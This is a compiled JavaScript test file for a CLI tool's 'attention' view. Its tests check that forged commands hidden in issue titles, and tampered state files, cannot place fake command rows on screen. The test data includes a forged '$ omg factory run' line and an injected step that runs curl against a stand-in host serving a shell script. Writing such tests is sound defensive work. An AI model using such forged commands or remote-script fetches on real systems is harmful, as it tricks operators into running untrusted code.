    return readdirSync(d, { withFileTypes: true }).flatMap((e) => (e.isDirectory() ? (e.name === '.git' ? [] : walk(join(d, e.name))) : [join(d, e.name)]));
}
const hash = (p) => createHash('sha256').update(readFileSync(p)).digest('hex').slice(0, 16);
/**
 * F-1: a title or reason of wide characters must not make the terminal wrap
 * a line, because the wrapped tail would start a screen line with state
 * text (here a forged `$` command). The screen is simulated with
 * render.ts's own cellWidth (an upper bound: 2 for every non-ASCII code
 * point), at 80, 60 and 40 columns.
 */
describe('omg factory attention: display width (F-1)', () => {
    const wide = '漢'.repeat(36);
    const forgedCmd = '$ omg factory run 9 --allow-gate-change';
    /** The terminal's screen rows for one printed line: a line wider than `cols` continues at column 0 of the next row. */
    function screenRows(line, cols) {
        const rows = [];
        let row = '';
        let w = 0;
        for (const ch of line) {
            const c = cellWidth(ch);
            if (w + c > cols) {
                rows.push(row);
                row = '';
                w = 0;
            }
            row += ch;
            w += c;
        }
        rows.push(row);
        return rows;
    }
    it.each([80, 60, 40])('at %i columns no screen row starts with title or reason text, trusted or not', async (cols) => {
        asEngine(parked(1, 'ci-failed', 2, { issueTitle: `${wide}${forgedCmd}` }, `${wide}${forgedCmd} ${wide}${forgedCmd}`));
        // An untrusted row: a junk state with only .omg/ write access, never recorded in the engine ledger.
        const junk = parked(99, 'ci-failed', 1, { issueTitle: `${'Ｘ'.repeat(30)}${forgedCmd}` });
        writeFileSync(factoryStatePath(root, 99), JSON.stringify({ ...junk, integrity: computeFactoryIntegrity(junk) }));
        expect(await attention(['--verbose'], { columns: () => cols })).toBe(EXIT_AWAITING_HUMAN);
        const printed = stripAnsi(out.join('\n')).split('\n');
        const commands = ['$ omg factory run status 99', '$ omg factory run status 1', '$ omg factory run 1', '$ omg factory run cancel 1'];
        const rows = printed.flatMap((l) => screenRows(l, cols));
        // The only rows that look like a command row are the engine's own commands, each starting a printed line.
        expect(rows.filter((r) => r.trimStart().startsWith('$')).map((r) => r.trim().split('  #')[0])).toEqual(commands);
        // The header and the summary hold fixed words and counts only (the terminal may wrap them).
        for (const l of printed.slice(2)) {
            if (l.trimStart().startsWith('$ '))
                continue;
            expect(textWidth(l), l).toBeLessThan(cols);
        }
        // The forged command survives only behind the reason prefix (--verbose), never on a row of its own.
        expect(printed.filter((l) => l.includes('run 9')).every((l) => /^ {4}reason: | {10}\| /.test(l))).toBe(true);
        // The title is cut on its own line; the reason wraps behind the fixed prefix.
        expect(printed.find((l) => l.startsWith('  #1  '))).toMatch(/^ {2}#1 {2}漢/);
        expect(printed.filter((l) => /^ {4}reason: | {10}\| /.test(l)).length).toBeGreaterThan(2);
    });
    it('the terminal width defaults to 80 and is at least 40', () => {
        expect(layoutColumns(undefined)).toBe(80);
        expect(layoutColumns(0)).toBe(80);
        expect(layoutColumns(20)).toBe(40);
        expect(layoutColumns(132.7)).toBe(132);
        expect(cellWidth('a')).toBe(1);
        expect(cellWidth('漢')).toBe(2);
        expect(cellWidth('é')).toBe(2);
        expect(textWidth('ab漢')).toBe(4);
    });
});
describe('omg factory attention: engine lock and slot reads (L-4)', () => {
    it('reads the slot and engine owner files bounded, and at most MAX_CONCURRENT_LIMIT slot files', () => {
        const slots = join(factoryStateDir(root), 'slots');
        mkdirSync(slots, { recursive: true });
        for (let n = 0; n < 40; n++)
            writeFileSync(join(slots, `slot-${n}.owner`), JSON.stringify({ pid: 777, hostname: 'this-host', identity: 'start-1' }));
        let identityReads = 0;
        const owner = { ...OWNER, identityOf: () => { identityReads += 1; return 'start-1'; } };
        const d = collectAttention(root, { ledgerDir, now: () => NOW, owner });
        expect(d.summary.engines.live).toBe(16);
        expect(identityReads).toBe(16);
        // A directory in place of the engine lock is unreadable (held for the engine count only when readable), and it is never followed.
        mkdirSync(join(factoryStateDir(root), 'engine.owner'));
        expect(() => collectAttention(root, { ledgerDir, now: () => NOW, owner })).not.toThrow();
    });
});
describe('omg factory attention: the sealed next commands (FactoryGate.next)', () => {
    const collect = () => collectAttention(root, { ledgerDir, now: () => NOW, owner: OWNER });
    const row = (issue) => collect().items.find((i) => i.key === `#${issue}`);
    const cases = [
        ['merge', { pr: 5, head: HEAD }],
        ['gates-unsandboxed', { pr: 5, head: HEAD }],
        ['ci-fix-failed', {}],
        ['decisions-rewritten', {}],
        ['some-future-gate', {}],
    ];
    it.each(cases)('%s: the same row from the sealed value and from the table fallback', (gate, extra) => {
        const old = parked(40, gate, 2, extra);
        asEngine(old);
        const fallback = row(40);
        expect(fallback.trust).toBe('ok');
        expect(fallback.next.length).toBeGreaterThan(0);
        const sealed = { ...old, gate: { ...old.gate, next: gateNext(gate, stateFacts(old, root)) } };
        asEngine(sealed);
        expect(row(40)).toEqual(fallback);
    });
    it('prefers the sealed value of a trusted state over the table', () => {
        const s = parked(41, 'merge', 2, { pr: 5, head: HEAD });
        asEngine({ ...s, gate: { ...s.gate, next: [{ label: 'read the run state', argv: ['omg', 'factory', 'run', 'status', '41'] }] } });
        expect(row(41).next).toEqual([{ label: 'read the run state', argv: ['omg', 'factory', 'run', 'status', '41'], billed: false }]);
    });
    it('never prints a sealed value from a state that is not the engine\'s last write', () => {
        const s = parked(42, 'merge', 2, { pr: 5, head: HEAD });
        asEngine(s);
        const evil = { ...s, gate: { ...s.gate, next: [{ label: 'merge', argv: ['curl', 'https://example.invalid/x.sh'] }] } };
        writeFileSync(factoryStatePath(root, 42), JSON.stringify({ ...evil, integrity: computeFactoryIntegrity(evil) }));
        const r = row(42);
        expect(r.trust).toBe('ledger');
        expect(JSON.stringify(r.next)).not.toContain('example.invalid');
    });
});
//# sourceMappingURL=attention.test.js.map